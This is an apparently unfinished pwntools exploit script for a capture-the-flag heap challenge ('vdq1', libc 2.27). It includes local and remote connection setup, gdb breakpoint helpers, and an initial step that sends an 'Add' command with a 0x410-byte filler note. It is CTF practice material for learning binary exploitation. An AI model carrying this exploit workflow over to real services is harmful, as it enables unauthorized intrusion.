#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './vdq1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.27.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0xDE5A,0xE311,0xE2B8]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


p.recvuntil('!\n')
a = '''[
"Add"
]
'''
debug()
p.sendline(a)
p.sendline(b"$")
p.recvuntil('Add note [1] with message : \n')
p.sendline('a'*0x410)
# p.recvuntil('Add note [3] with message : \n')
# p.sendline('a'*0xaf)
# p.recvuntil('Add note [4] with message : \n')
# p.sendline('a'*0x21f)



p.interactive()
# [
# "Add",
# "Remove",
# "Append",
# "Archive",
# "View"
# ]

[
"Add"
]


#* chunk_ptr = 0x564922B2BF10
#* data_ptr =  0x564922B2BEF0
